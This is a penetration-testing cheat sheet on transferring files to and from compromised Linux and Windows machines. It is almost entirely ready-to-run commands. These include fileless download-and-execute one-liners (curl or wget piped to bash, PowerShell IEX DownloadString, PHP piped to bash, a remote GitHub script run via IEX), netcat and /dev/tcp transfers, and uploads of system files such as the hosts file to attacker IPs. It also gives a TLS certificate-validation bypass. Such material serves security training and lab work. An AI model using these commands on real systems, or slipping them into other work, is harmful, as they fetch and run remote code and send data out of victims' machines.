# References and Links
[Harmj0y Powershell download cradles](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)

# Linux File Transfers
## FTP
### Simple Python FTP Server
- Installation
```
sudo apt install python3-pyftpdlib
```
- Start the Server
```
python3 -m pyftpdlib -p 21 --write
```
## Simple Python HTTP Server
```
python3 -m http.server [port]
```
- Download
```
# Linux

# Windows PowerShell
(New-Object Net.WebClient).DownloadFile('ftp://10.10.10.10/file.txt', '<Output_File_Name>')

# Windows CMD
ftp [hostname/IP]
```
## Base64 Encode/Decode
```
#Base64 Encode
cat <file> |base64 -w 0;echo
#Base64 Decode
echo -n '<encoded data>' | base64 -d > <filename>
```
## Web Downloads
wget
```bash
wget https://<URL> -O <filename>
```
curl
```bash
curl -o <filename> <URL>
```
## Fileless Attacks
Can pipe directly to most interpreters, like ```bash``` or ```python```
Curl
```bash
curl -o <filename> <URL> | bash
```
wget
```bash
wget -qO- <URL> | bash
```
## Download with Bash (/dev/tcp)
Connect to the target
```bash
exec 3<>/dev/tcp/<IP>/<port>
```
Craft a GET request
```bash
echo -e "Get /<filename> HTTP/1.1\n\n">&3
```
Print the response
```bash
cat <&3
```
## SSH Downloads
Enable the ssh server
```bash
sudo systemctl enable ssh
```
Start the ssh server
```bash
sudo systemctl start ssh
```
Check for SSH Listener
```bash
netstat -lnpt
```
Download via SCP
```bash
scp plaintext@<IP>:/<path>/<filename> .
```
## Web Upload
Create a cert for the webserver
```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```
Start the webserver
```bash
sudo python3 -m uploadserver 443 --server-certificate <cert path>
```
Upload from compromised machine
```bash
curl -X POST <URL> -F 'files=@<path_to_file>' -F 'files=@<path_to_file>' --insecure
# Note multiple files in the same command. --insecure flag needed for self-signed cert
```

**Copy Files to a directory and start a web server on the compromised machine**  
Starting webservers in various languages
```bash
# python3
python3 -m http.server
# python2.7
python2.7 -m SimpleHTTPServer
# PHP
php -S 0.0.0.0:8000
# Ruby
ruby -run -ehttpd . -p8000
```
## SCP Upload
```bash
scp <local_file> <user>@<IP>:<Desination_path_to_save_the_file>
```
# Windows File Transfers
## PowerShell Base64 Encode/Decode
```powershell
#Base64 Encode
[Convert]::ToBase64String((Get-Content -path "File_to_Encode" -Encoding byte))
#Base64 Decode
[IO.File]::WriteAllBytes("Output_File", [Convert]::FromBase64String("Base64_Encoded_Payload"))
```
## PowerShell Web Downloads
1. Files vs. Fileless  
a. Files = Download and save the file  
b. Fileless = Download and execute without saving the file 
```powershell
# File Download Example
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')

# Fileless Download Example
IEX (New-Object Net.WebClient).DownloadString('<Target File URL>')
# We can also pipe the input directly into IEX
(New-Object Net.WebClient).DownloadString('<Target File URL>') | IEX
``` 
Powershell v3.0 and later can use Invoke-WebRequest(by default is aliased to ```iwr```,```curl```, and ```wget```)
```powershell
Invoke-WebRequest <Target File URL> -OutFile <Output_File_Name>
```
<ins>**Common Errors with Powershell**</ins>  
Internet Explorer first-launch configuration not being completed will prevent downloads. To bypass, use ```-UseBasicParsing```
```Powershell
Invoke-WebRequest <Target file URL> -UseBasicParsing | IEX
```
SSL/TLS secure channel throws an error if the certificate is not trusted.  
Bypass:
```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```
## SMB Downloads
Create a quick SMB server in Linux
```bash
# Simple Share
sudo impacket-smbserver share -smb2support /tmp/smbshare

# Share with Authenticated Access
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

CMD Copy a file from an SMB Server
```cmd
copy \\10.10.10.10\share\file
# This command will be blocked in modern OS's that don't allow unauthenticated guest access
```
CMD Map File share to drive letter with authentication
```cmd
net use n: \\10.10.10.10\share /user:username password
```
## FTP Downloads
FTP Setup on linux attack host
```bash
# Install 
sudo apt install python3-pyftpdlib
# Specify the port, by default pyftpdlib uses port 2121
sudo python3 -m pyftpdlib --port 21
```

Download via FTP using Powershell
```powershell
(New-Object Net.WebClient).DownloadFile('ftp://10.10.10.10/file.txt', '<Output_File_Name>')
```

Create a batch file to download our file (useful if we don't have an interactive shell)
```cmd
echo open 192.168.49.128 > ftpcommand.txt
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```
## PowerShell Web Uploads
PowerShell doesn't have built-in upload functionality, so we'll have to build it or download it.

Linux Upload Server
```bash
# Install
pip3 install uploadserver

# Usage
python3 -m uploadserver
```

PowerShell Script to Upload a file
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
import-module ./PSUpload.ps1
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File <File_to_upload>
```
Powershell Base64 WebUpload
```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
# Convert file to base64 and enter into variable $b64
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
# Send a web request with the base64 variable in the body
# catch the string with netcat on the other end, and base64 decode the body, giving you the original file
```
## SMB Uploads
Installing WebDav Server
```bash
# apt
sudo apt install python3-wsgidav
# pip
sudo pip3 install wsgidav cheroot
```
Starting the webdav python module
```bash
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```
Connecting to the WebDav share from Windows
```cmd
dir \\10.10.10.10\DavWWWRoot
# DavWWWRoot is not the name of a share. It's a special keyword fro the mini-redirector driver to connect to a webdav share
```
Uploading files using SMB WebDAV
```cmd
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
```
## FTP Uploads
```powershell
(New-Object Net.WebClient).UploadFile('ftp://10.10.10.10/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```
Create a command file for the client to upload a file (useful in limited shells)
```cmd
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```
# Transferring with Code
## Python - Download
Python2 Download
```bash
python2.7 -c 'import urllib;urllib.urlretrieve ("<URL>", "<Saved_File_Name")'
```
Python3 Download
```bash
python3 -c 'import urllib.request;urllib.request.urlretrieve("<URL>", "<Saved_File_Name")'
```
## Python - Upload
Start UploadServer
```bash
python3 -m uploadserver
```
Python upload one-liner
```bash
python3 -c 'import requests;requests.post("<Upload_URL>",files={"files":open("<Local_File_to_Upload","rb")})'
```
## PHP - Download
PHP Download w/ File_get_contents()
```bash
php -r '$file = file_get_contents("<URL>"); file_put_contents("<Saved_File_Name>",$file);'
```
PHP Download w/ Fopen()
```bash
php -r 'const BUFFER = 1024; $fremote = fopen("<URL>", "rb"); $flocal = fopen("<Saved_File_Name>", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```
PHP Download and Pipe to Bash
```bash
php -r '$lines = @file("<URL>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```
## Ruby - Download
```bash
ruby -e 'require "net/http"; File.write("<Saved_File_Name>", Net::HTTP.get(URI.parse("<URL>")))'
```
## Perl - Download
```bash
perl -e 'use LWP::Simple; getstore("<URL>", "<Saved_File_Name");'
```
## Javascript - Download
Create wsget.js
```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```
From CMD or PowerShell
```powershell
cscript.exe /nologo wget.js <URL> <Output_File_Name>
```
## VBScript - Download
Create wget.vbs
```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```
From CMD or PowerShell
```powershell
cscript.exe /nologo wget.vbs <URL>  <OutFile>
```
# Misc File Transfer Methods
## Transfer w/ Netcat
Compromised machine
```bash
# OG Netcat
nc -lp 8000 > <Outflie>
# Ncat
ncat -lp 8000 --recv-only > <Outfile>
```
Attack Host
```bash
# OG Netcat
nc -q 0 <Compromised IP><PORT> < <Upload_File>
# Ncat
ncat --send-only <Compromised IP><PORT> < <Upload_File
```
Sending file as Input to Netcat (useful when a firewall is blocking inbound connections)
```bash
# OG Netcat Attack Host
sudo nc -lp 443 -q 0 < <InFile>
# Ncat Attack Host
sudo ncat -lp 443 --send-only < <InFile>
# OG Netcat Compromised Machine
nc <Attack_Host_IP><Port> > Outfile
# Ncat Compromised machine
ncat <Attack_Host_IP><Port> --recv-only > <OutFile>
```
Connecting to Netcat using /dev/tcp to Receive the file
```bash
cat < /dev/tcp/<Attack_Host_IP>/<port> > <Outfile>
```
## PowerShell Session File Transfer
Enabling powershell remoting opns ports 5986/HTTP & 5986/HTTPS
Must be administrator, Remote Management Users member, or have explicit permissions
Create a Powershell Session
```powershell
# Create Session Object
$Session = New-PSSession -ComputerName <targetComputer>
# Copy File to computer w/ Session Object
Copy-Item -Path <Local_File> -ToSession $Session -Destination <Destination_File_Path>
# Copy File from computer w/ Session Object
Copy-Item -Path "<Remote_File_Path\Name>" -Destination <Local_Path> -FromSession $Session
```
## RDP
Mounting a Linux Folder using rdesktop
```bash
rdesktop <Target_IP> -d <domain> -u <user> -p <password> -r disk:linux='Local_Folder'
```
Mounting a Linux Folder use xfreerdp
```bash
xfreerdp /v:<Target_IP> /d:<domain> /u:<user> /p:<password> /drive:linux,Local_Folder
```
To Access on the windows machine, connect to ```\\tsclient\```


# Catching files over HTTP/S
